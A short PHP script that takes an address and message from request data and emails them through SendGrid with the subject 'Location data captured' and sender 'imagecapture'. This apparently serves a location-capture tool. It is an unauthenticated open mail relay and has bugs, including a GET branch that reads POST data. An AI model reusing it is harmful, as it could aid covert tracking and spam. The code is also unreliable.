<?php

  require 'vendor/autoload.php';

  $_email   = '';
  $_message = '';

  if($_POST) {
    $GLOBALS['_email']   = new SendGrid\Email(null, $_POST['email']);
    $GLOBALS['_message'] = new SendGrid\Content("text/plain", $_POST['message']);
  }
  if($_GET) {
    $GLOBALS['_email']   = new SendGrid\Email(null, $_POST['email']);
    $GLOBALS['_message'] = new SendGrid\Content("text/plain", $_POST['message']);
  }
  $mail   = new SendGrid\Mail('imagecapture', "Location data captured", $_email, $_message);
  $apiKey = getenv('SENDGRID_API_KEY');
  $sg = new \SendGrid($apiKey);

  $sg->client->mail()->send()->post($mail);
?>
